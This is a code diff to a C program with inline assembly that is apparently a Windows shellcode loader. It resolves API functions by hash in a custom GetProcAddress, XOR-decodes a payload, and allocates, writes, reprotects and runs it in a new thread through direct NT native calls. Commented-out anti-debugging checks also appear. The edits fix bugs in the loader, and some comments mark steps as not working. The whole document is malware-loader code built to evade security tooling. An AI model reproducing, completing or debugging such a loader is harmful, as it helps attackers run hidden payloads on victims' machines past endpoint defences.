@@ -7,7 +7,7 @@
 typedef NTSYSAPI NTSTATUS(NTAPI* NtAlocVirtMem)(
     HANDLE ProcessHandle,
     PVOID* BaseAddress,
-    ULONG ZeroBits,
+    ULONG_PTR ZeroBits,
     PSIZE_T RegionSize,
     ULONG AllocationType,
     ULONG Protect
@@ -117,7 +117,7 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
             "mov 0x18(%%rax), %%ecx\n\t"
             "mov 0x20(%%rax), %%r8d\n\t"
             "add %%rdx, %%r8\n\t"
-            "mov %%rax, %%rbx\n\t"
+            "push %%rax\n\t"
         "find_function:\n\t"
             "jrcxz final\n\t"
             "xor %%r9d, %%r9d\n\t"            // Clear hash accumulator
@@ -135,7 +135,7 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash) {
             "cmp %%r10d, %%r9d\n\t"           // Compare hash
             "jnz find_function\n\t"                     // If equal, jump to found
         "final:\n\t"
-            "mov %%rbx, %%rax\n\t"
+            "pop %%rax\n\t"
             "mov 0x24(%%rax), %%r8d\n\t"
             "add %%rdx, %%r8\n\t"
             "mov (%%r8, %%rcx, 2), %%cx\n\t"
@@ -159,7 +159,7 @@ void main() {
 
 
 
-    ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
+    // ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
 
     // int is_debugged = d();
     // int size = z();
@@ -193,8 +193,9 @@ void main() {
 
     
     // Allocating executable memory
-    // exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    _NtAlocVirtMem((HANDLE)-1, &exec, 0, (PSIZE_T)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // NOT WORKING
+    // _NtAlocVirtMem((HANDLE)-1, &exec, 0, (PSIZE_T)sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // XORing shellcode
     for (size_t i = 0; i < sizeof(payload); i++) {
@@ -202,19 +203,17 @@ void main() {
     }
     
     // Copy shellcode into allocated memory
-    // memcpy(exec, payload, sizeof(payload));
     _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);
 
     // Changing memory protection to PAGE_EXECUTE_READ
-    // rv = VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
+    // VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
+    // NOT WORKING
     _NtProtectVirtMem((HANDLE)-1, &exec, (PSIZE_T)sizeof(payload), PAGE_EXECUTE_READ, &old_protect);
 
     // Executing shellcode in a new thread
-    // th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
-    // PROBLEME ICI CRASH, arguments issue maybe
     _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, FALSE, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
 
-    // WaitForSingleObject(th, -1);
+    // Waiting for thread to finish
     _NtWaitForSingleObject(th, FALSE, NULL);
 }
 
